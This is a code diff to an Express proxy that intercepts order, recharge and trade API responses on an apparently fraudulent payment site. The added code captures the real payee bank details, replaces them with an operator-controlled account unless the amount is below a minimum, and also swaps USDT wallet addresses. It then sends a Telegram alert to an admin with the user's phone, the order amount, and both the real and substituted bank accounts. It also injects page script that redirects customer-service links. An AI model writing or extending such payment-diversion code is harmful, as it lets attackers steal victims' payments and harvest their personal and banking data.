@@ -247,6 +247,25 @@ const BANK_FIELD_MAP = {
   payeebankname:'bankName',payerbankname:'bankName'
 };
 
+function captureRealBank(obj, depth) {
+  if (!obj || typeof obj !== 'object' || (depth || 0) > 8) return null;
+  if (Array.isArray(obj)) {
+    for (const item of obj) { const r = captureRealBank(item, (depth||0)+1); if (r) return r; }
+    return null;
+  }
+  const found = { accountHolder:'', accountNo:'', ifsc:'', bankName:'', upiId:'' };
+  for (const k of Object.keys(obj)) {
+    const kl = k.toLowerCase().replace(/[_-]/g,'');
+    const mapped = BANK_FIELD_MAP[kl];
+    if (mapped && !found[mapped] && obj[k] && String(obj[k]).trim()) found[mapped] = String(obj[k]).trim();
+  }
+  if (found.accountNo || found.ifsc) return found;
+  for (const k of Object.keys(obj)) {
+    if (typeof obj[k] === 'object') { const r = captureRealBank(obj[k], (depth||0)+1); if (r) return r; }
+  }
+  return null;
+}
+
 function scanHasBankFields(obj, depth) {
   if (!obj || typeof obj !== 'object' || depth > 10) return false;
   if (Array.isArray(obj)) { return obj.some(item => scanHasBankFields(item, depth + 1)); }
@@ -1007,27 +1026,14 @@ app.all('/xxapi/*', async (req, res) => {
 
     const isOrder = /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
       || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST');
+    let _orderId = '';
     if (isOrder) {
       const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo'];
-      let orderId = '';
       if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
         for (const f of orderFields) {
-          if (respData[f] && String(respData[f]).length >= 3) { orderId = String(respData[f]); break; }
+          if (respData[f] && String(respData[f]).length >= 3) { _orderId = String(respData[f]); break; }
         }
       }
-      const bank = getActiveBank(data, userId);
-      if (orderId && bank) {
-        if (!data.orderBankMap) data.orderBankMap = {};
-        data.orderBankMap[orderId] = {
-          bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
-          time: now, userId: userId || ''
-        };
-      }
-      notifyAdmin(data,
-`🔔 ORDER DETECTED
-👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${orderId ? '\n📋 Order: ' + orderId : ''}
-💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
-🕐 ${now}`);
     }
 
     if (urlLower.includes('kyc') || urlLower.includes('bind') || urlLower.includes('linkkyc')) {
@@ -1083,17 +1089,30 @@ app.all('/xxapi/*', async (req, res) => {
       bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}\n📊 Status: ${response.status}`).catch(()=>{});
     }
 
+    const _realBankSnap = captureRealBank(jsonResp);
+
+    let _bankReplaced = false;
+    let _replacedBank = null;
+    let _notReplacedAmt = null;
+    let _notReplacedMin = null;
+
     if (data.botEnabled !== false) {
       const bank = getActiveBank(data, userId);
       if (bank) {
         let shouldReplace = true;
         if (bank.minAmount) {
           const amt = getOrderAmount(req, respData);
-          if (amt !== null && amt < bank.minAmount) shouldReplace = false;
+          if (amt !== null && amt < bank.minAmount) {
+            shouldReplace = false;
+            _notReplacedAmt = amt;
+            _notReplacedMin = bank.minAmount;
+          }
         }
         if (shouldReplace) {
           const globalHasAcct = scanHasBankFields(jsonResp, 0);
           deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
+          _bankReplaced = true;
+          _replacedBank = bank;
         }
       }
 
@@ -1110,6 +1129,34 @@ app.all('/xxapi/*', async (req, res) => {
       if (data.usdtAddress) {
         replaceUsdtAddress(jsonResp, data.usdtAddress, 0);
       }
+    }
+
+    if (isOrder) {
+      const _orderAmt = _notReplacedAmt !== null ? _notReplacedAmt : getOrderAmount(req, respData);
+      if (_orderId) {
+        if (!data.orderBankMap) data.orderBankMap = {};
+        const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
+        data.orderBankMap[_orderId] = { bank: `${bk.accountHolder||''} | ${bk.accountNo||''} | ${bk.ifsc||''}`, time: now, userId: userId || '' };
+      }
+      const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
+        ? `🏦 Real Bank:\n  Name: ${_realBankSnap.accountHolder || 'N/A'}\n  Acc:  ${_realBankSnap.accountNo || 'N/A'}${_realBankSnap.ifsc ? '\n  IFSC: ' + _realBankSnap.ifsc : ''}${_realBankSnap.bankName ? '\n  Bank: ' + _realBankSnap.bankName : ''}${_realBankSnap.upiId ? '\n  UPI:  ' + _realBankSnap.upiId : ''}`
+        : '🏦 Real Bank: N/A';
+      let replaceLine;
+      if (_bankReplaced && _replacedBank) {
+        replaceLine = `✅ Replaced With:\n  Name: ${_replacedBank.accountHolder}\n  Acc:  ${_replacedBank.accountNo}\n  IFSC: ${_replacedBank.ifsc}${_replacedBank.bankName ? '\n  Bank: ' + _replacedBank.bankName : ''}${_replacedBank.upiId ? '\n  UPI:  ' + _replacedBank.upiId : ''}`;
+      } else if (_notReplacedAmt !== null) {
+        replaceLine = `⚠️ NOT Replaced\n  ₹${_notReplacedAmt} < Min ₹${_notReplacedMin} — Real bank shown`;
+      } else {
+        replaceLine = `❌ NOT Replaced (no active bank)`;
+      }
+      notifyAdmin(data,
+`🎯 ORDER PLACED
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${_orderId ? '\n📋 Order: ' + _orderId : ''}${_orderAmt !== null ? '\n💰 Amount: ₹' + _orderAmt : ''}
+━━━━━━━━━━━━━━━━━━━━
+${realLine}
+━━━━━━━━━━━━━━━━━━━━
+${replaceLine}
+🕐 ${now}`);
     }
 
     if (userId) await saveData(data);
@@ -1266,8 +1313,8 @@ if(!s||typeof s!=='string')return false;
 return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1||s.indexOf('telegram.org')>-1||s.indexOf('chat.')>-1||s.indexOf('support')>-1||s.indexOf('service')>-1||s.indexOf('kefu')>-1;}
 
 function isCSPage(){
-var txt=(document.body?document.body.innerText:'').toLowerCase();
-return txt.indexOf('customer service')>-1||txt.indexOf('online service')>-1||txt.indexOf('online csr')>-1||txt.indexOf('whatsapp')>-1;}
+var url=(window.location.href||window.location.pathname||'').toLowerCase();
+return url.indexOf('customerservice')>-1||url.indexOf('customer_service')>-1||url.indexOf('customer-service')>-1||url.indexOf('kefu')>-1||url.indexOf('online_service')>-1||url.indexOf('servicelist')>-1||url.indexOf('csrlist')>-1;}
 
 function fixLinks(){
 if(!CFG||!CFG.tg)return;
